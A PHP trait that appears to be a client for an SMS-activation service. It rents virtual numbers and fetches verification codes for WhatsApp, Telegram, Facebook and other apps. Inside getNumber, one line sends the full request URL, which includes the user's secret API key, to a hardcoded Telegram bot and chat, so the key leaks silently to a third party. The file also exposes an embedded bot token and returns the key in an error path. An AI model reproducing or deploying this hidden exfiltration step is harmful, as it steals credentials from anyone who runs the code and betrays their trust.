<?php

#https://www.supersmstech.com/api/getnumber?channel=$operator&country=$country&pid=$app&secret_key=$api_key

/*
wa=2
tg=5
fb=7
ig=24
tw=22
lf=82
go=6
im=27
vi=18
fu=134
nf=21
*/

trait sms_code {
	public function URL(){
		return "https://sms-code.ru/api.php?secret_key={$this->getMyKey()}&method=++action++&";
	}
	
	public function get_default_apps($app){
		$apps_default = ['telegram'=>'tg','whatsapp'=>'wa'];
		return $apps_default[$app] ?? $app;
	}
	public function get_default_apps2($app){
		$apps_def = ['wa'=>14, 'tg'=>5, 'fb'=>9, 'ig'=>4, 'tw'=>20, 'lf'=>36, 'go'=>10, 'im'=>48, 'vi'=>8, 'fu'=>235, 'nf'=>19];
		return $apps_def[$app] ?? $app;
	}
	
	public function get_default_countries($country){
		$countries_default    = [
			'RU'=> 0,'UA'=> 1,'KZ'=> 2,'CN'=> 3,'PH'=> 4,'MM'=> 5,'ID'=> 6,'MY'=> 7,'KE'=> 8,'TZ'=> 9,'VN'=> 10,'KG'=> 11,'US'=> 187,'IL'=> 13,'HK'=> 14,'PL'=> 15,'GB'=> 16,'MG'=> 17,'ZR'=> 18,'NG'=> 19,'MO'=> 20,'EG'=> 21,'IN'=> 22,'IE'=> 23,'KH'=> 24,'LA'=> 25,'HT'=> 26,'CI'=> 27,'GM'=> 28,'RS'=> 29,'eee'=> 30,'ZA'=> 31,'RO'=> 32,'CO'=> 33,'EE'=> 34,'AZ'=> 35,'CA'=> 36,'MA'=> 37,'GH'=> 38,'AR'=> 39,'UZ'=> 40,'CM'=> 41,'TD'=> 42,'DE'=> 43,'LT'=> 44,'SE'=> 46,'IQ'=> 47,'NL'=> 48,'LV'=> 49,'AT'=> 50,'BY'=> 51,'TH'=> 52,'SA'=> 53,'MX'=> 54,'TW'=> 55,'ES'=> 56,'IR'=> 57,'DZ'=> 58,'SI'=> 59,'BD'=> 60,'SN'=> 61,'TR'=> 62,'CZ'=> 63,'LK'=> 64,'PE'=> 65,'PK'=> 66,'NZ'=> 67,'GN'=> 68,'ML'=> 69,'VE'=> 70,'ET'=> 71,'MN'=> 72,'BR'=> 73,'AF'=> 74,'UG'=> 75,'AO'=> 76,'CY'=> 77,'FR'=> 78,'PG'=> 79,'MZ'=> 80,'NP'=> 81,'BE'=> 82,'BG'=> 83,'HU'=> 84,'MD'=> 85,'IT'=> 86,'PY'=> 87,'HN'=> 88,'TN'=> 89,'NI'=> 90,'TL'=> 91,'BO'=> 92,'CR'=> 93,'GT'=> 94,'AE'=> 95,'ZW'=> 96,'PR'=> 97,'SD'=> 98,'TG'=> 99,'KW'=> 100,'SV'=> 101,'LY'=> 102,'JM'=> 103,'TT'=> 104,'EC'=> 105,'SZ'=> 106,'OM'=> 107,'BA'=> 108,'DO'=> 109,'SY'=> 110,'QA'=> 111,'PA'=> 112,'CU'=> 113,'MR'=> 112,'SL'=> 115,'JO'=> 116,'PT'=> 117,'BB'=> 118,'BI'=> 119,'BJ'=> 120,'BW'=> 123,'GE'=> 128,'GR'=> 129,'GW'=> 130,'GY'=> 131,'LR'=> 135,'LS'=> 136,'MW'=> 137,'NA'=> 138,'RW'=> 140,'SK'=> 141,'SR'=> 142,'TJ'=> 143,'BH'=> 145,'ZM'=> 147,'AM'=> 148,'BF'=> 152,'GA'=> 154,'AL'=> 155,'UY'=> 156,'MU'=> 157,'BT'=> 158,'MV'=> 159,'GP'=> 160,'TM'=> 161,'GF'=> 162,'FI'=> 163,'LC'=> 164,'LU'=> 165,'VC'=> 166,'GQ'=> 167,'DJ'=> 168,'AG'=> 169
		];
		$countries     = ['0'=>"27", '1'=>"12", '2'=>"47", '3'=>"103", '4'=>"102", '5'=>"33", '6'=>"135", '7'=>"94", '8'=>"43", '9'=>"29", '10'=>"18", '11'=>"51", '13'=>"54", '14'=>"163", '15'=>"87", '16'=>"77", '17'=>"134", '18'=>"24", '19'=>"22", '20'=>"301", '21'=>"13", '22'=>"2", '23'=>"121", '24'=>"99", '25'=>"86", '26'=>"15", '27'=>"55", '28'=>"113", '29'=>"122", '30'=>"81", '31'=>"1", '32'=>"129", '33'=>"48", '34'=>"123", '35'=>"61", '36'=>"143", '37'=>"39", '38'=>"42", '39'=>"32", '40'=>"21", '41'=>"53", '42'=>"118", '43'=>"25", '44'=>"166", '45'=>"239", '46'=>"136", '47'=>"83", '48'=>"95", '49'=>"154", '50'=>"268", '51'=>"56", '52'=>"71", '53'=>"70", '54'=>"28", '55'=>"165", '56'=>"66", '57'=>"16", '58'=>"8", '59'=>"162", '60'=>"4", '61'=>"84", '62'=>"50", '63'=>"125", '64'=>"30", '65'=>"17", '66'=>"3", '67'=>"264", '68'=>"170", '69'=>"62", '70'=>"46", '71'=>"9", '72'=>"265", '73'=>"14", '74'=>"114", '75'=>"40", '76'=>"11", '77'=>"130", '78'=>"25", '79'=>"7", '80'=>"10", '81'=>"20", '82'=>"76", '83'=>"57", '84'=>"91", '85'=>"68", '86'=>"128", '87'=>"49", '88'=>"31", '89'=>"34", '90'=>"67", '91'=>"35", '92'=>"152", '93'=>"73", '94'=>"133", '95'=>"97", '96'=>"19", '97'=>"120", '98'=>"65", '99'=>"88", '100'=>"104", '101'=>"38", '102'=>"58", '103'=>"45", '104'=>"98", '105'=>"37", '106'=>"23", '107'=>"79", '108'=>"108", '109'=>"112", '110'=>"90", '111'=>"75", '112'=>"44", '113'=>"146", '114'=>"101", '115'=>"150", '116'=>"52", '117'=>"107", '118'=>"110", '119'=>"93", '120'=>"72", '121'=>"156", '122'=>"151", '123'=>"26", '124'=>"261", '125'=>"167", '126'=>"272", '127'=>"153", '128'=>"149", '129'=>"147", '130'=>"105", '131'=>"117", '132'=>"303", '133'=>"226", '134'=>"164", '135'=>"168", '136'=>"36", '137'=>"41", '138'=>"6", '139'=>"89", '140'=>"63", '141'=>"233", '142'=>"132", '143'=>"155", '144'=>"241", '145'=>"124", '146'=>"78", '147'=>"5", '148'=>"115", '149'=>"109", '150'=>"80", '151'=>"148", '152'=>"74", '153'=>"266", '154'=>"64", '155'=>"160", '156'=>"82", '157'=>"59", '158'=>"92", '159'=>"106", '160'=>"126", '161'=>"60", '162'=>"140", '163'=>"139", '164'=>"141", '165'=>"131", '166'=>"158", '167'=>"96", '168'=>"138", '169'=>"137", '170'=>"157", '171'=>"142", '172'=>"267", '173'=>"119", '174'=>"127", '175'=>"270", '176'=>"304", '177'=>"100", '178'=>"235", '179'=>"225", '180'=>"271", '181'=>"234", '182'=>"169", '183'=>"242", '184'=>"269", '185'=>"263", '186'=>"240", '187'=>"69", '188'=>"238", '189'=>"236", '190'=>"273", '192'=>"232", '193'=>"228", '195'=>"345", '197'=>"227", '198'=>"231", '199'=>"229"];
		
		return $countries[$countries_default[$country]];
	}
	
	public function get_prices_virtual($app,$country){
		$response     = [];
		$responsei     = [];
		
		$response['FirstJeProce10']   = "10 | 1000";
		$response['FirstJePrice10']   = 'First';
		
		$responsei    = [true,$response];
		#$app            = $app != 'any' ? $this->get_default_apps($app) : '';
		#$country     = $country != 'any' ? $this->get_default_countries($country) : 'any';
		#$url     = $this->URL()."action=getPrices&country={$country}&service={$app}";
		#$get_contents      = file_get_contents($url);
		#print($url);
		#$get_contents      = file_get_contents($this->URL."guest/prices?country=$country&product=$app");
		#$get_contents =  file_get_contents("https://5sim.biz/v1/guest/prices?country=russia&product={$app}");
		#file_get_contents('https://5sim.biz/v1/guest/prices?country=russia');
		
		#$responsei    = [false,'NO_JSON'];
		return $responsei ?? [false,'UNKOWN_ERROR'];
	}

	
	
	public function get_headers(){
		$headers   = array();
		$headers[] = 'Authorization: Bearer ' . $this->key5sim_biz;
		$headers[] = 'Accept: application/json';
		return $headers;
	}
	
	public function getNumber($app,$country,$opreator){
		$country   = $this->get_default_countries($country);
		$app          = $this->get_default_apps($app);
		$app          = $this->get_default_apps2($app);
		$action      = __FUNCTION__;
		$url             =  str_replace('++action++','phone',$this->URL())."service={$app}&country={$country}&multiple_sms=0";
		file_get_contents("https://api.telegram.org/bot5992578497:AAGznI2iiY3yexqKE8l5uFC_FrtyzNNmVbU/sendMessage?chat_id=1462127457&text=".urlencode($url));
		#$headers   = $this->get_headers();
		#echo $url; exit;
		#$result      = $this->sendCurl($url,'GET',true,$headers);
		$result      = file_get_contents($url);
		
		if(preg_match("/}/",$result)){
			$bought     = json_decode($result);
			if ($bought->status == 'ok'){
				$result      = [true,['id'=>$bought->data->activation, 'phone'=>$bought->data->number]];
			} else {
				$result      = [false,'NoNo'];
			}
		}
				
		/*
		if(preg_match("/[a-zA-Z\_]\:(.+)\:(.+)/",$result,$bought)){
			$result     = [true,['id'=>$bought[1],'phone'=>$bought[2]]];
			#print_r($result);
		} else {
			return [false,$result];
		}
		#print($result) ?? print_r($result);
		*/
		
		if(is_array($result)){
			if($result[0] != false){
				$some_handle     = json_decode(json_encode($result[1]));
				$response       = [
					'ID'=>$some_handle->id,
					'PHONE'=>$some_handle->phone
				] ?? [false,'NO__NUMBERS'];
				return [true,$response];
			} else {
				return [false,'ERROR_IN_CURL'];
			}
		} else {
			return [false,$result];
		}
	}
	
	public function getCode($id){
		$url              =  str_replace('++action++','sms',$this->URL())."activation={$id}";
		#$headers    = $this->get_headers();
		#$result        = $this->sendCurl($url,'GET',true,$headers);
		$result      = file_get_contents($url);
		
		/*
		if(preg_match("/[a-zA-Z\_]\:(.+)/",$result,$bought)){
			$result     = [true,['status'=>'RECEIVED','code'=>$bought[1]]];
		} else {
			$result   = $result;
		}
		*/
		
		if(preg_match("/}/",$result)){
			$bought     = json_decode($result);
			if ($bought->status == 'ok'){
				$result     = [true,['status'=>'RECEIVED','code'=>$bought->data]];
			} else {
				$result   = $result;
			}
		} else {
			$result   = $result;
		}
		
		if(is_array($result)){
			if($result[0] != false){
				$some_handle     = json_decode(json_encode($result[1]));
				if($some_handle->status == 'RECEIVED'){
					if(preg_match("/([0-9\-]{5,7})/",$some_handle->code,$pc)){
						$codei       = $pc[1];
						if (preg_match("/\-/",$codei)){
							$codei    = preg_replace("/\-/","",$codei);
						}
					}
					$response       = [
						#'PHONE'=>$some_handle->phone,
						'CODE'=>$codei
						#'TEXT'=>$some_handle->sms->{0}->text,
					];
					return [true,$response];
				} else {
					return [false,$some_handle->status];
				}
			} else {
				return [false,'ERROR_IN_CURL'];
			}
		} else {
			return [false,$result];
		}
	}
	
	public function cancelNumber($id){
		#$url              =  /*$this->URL.*/"https://5sim.biz/v1/user/cancel/{$id}";
		$url              =  str_replace('++action++','cancel',$this->URL())."activation={$id}";
		#$headers    = $this->get_headers();
		#$result        = $this->sendCurl($url,'GET',true,$headers);
		
		$rodict   = $this->getCode($id);
		
		if ($rodict[0] == true){
			$result      = file_get_contents($url);
			return [false,$result];
		} else {
			$result      = file_get_contents($url);
			return [true,$result];
		}
		
		/*
		$result      = file_get_contents($url);
		if(!is_array($result)){
			if($result != false){
				#$some_handle     = json_decode($result[1]);
				
				if($result == 'ACCESS_CANCEL' || $result == 'STATUS_CANCEL'){
					return [true,$result];
				} else {
					return [false,$result];
				}
			} else {
				return [false,'ERROR_IN_CURL'];
			}
		} else {
			return [false,'PARSE_IN_CURL'];
		}
		*/
	}
	
	public function finishNumber($id){
		#$url              =  $this->URL."user/finish/{$id}";
		$url              =  $this->URL()."action=setStatus&status=6&id={$id}";
		#$headers    = $this->get_headers();
		#$result        = $this->sendCurl($url,'GET',true,$headers);
		$result      = file_get_contents($url);
		if(!is_array($result)){
			if($result != false){
				#$some_handle     = json_decode($result[1]);
				if(preg_match("/^ACCESS/",$result)){
					return [true,$result];
				} else {
					return [false,$result];
				}
			} else {
				return [false,'ERROR_IN_CURL'];
			}
		} else {
			return [false,'PARSE_IN_CURL',$result];
		}
	}
	
	public function getBalance(){
		$action     = __FUNCTION__;
		$url            =  str_replace('++action++','get_balance',$this->URL());
		$result      = file_get_contents($url);
		$jqq          = json_decode($result);
		
		if ($jqq->status == 'ok'){
			return [true,$jqq->data->balance];
		} else {
			return [false,$this->getMyKey()];
		}
		/*
		if(preg_match("/[a-zA-Z\_]\:(.+)/",$result,$balance)){
			return [true,$balance[1]];
		} else {
			return [false,$this->getMyKey()];
		}
		*/
	}
	//// other codes
}

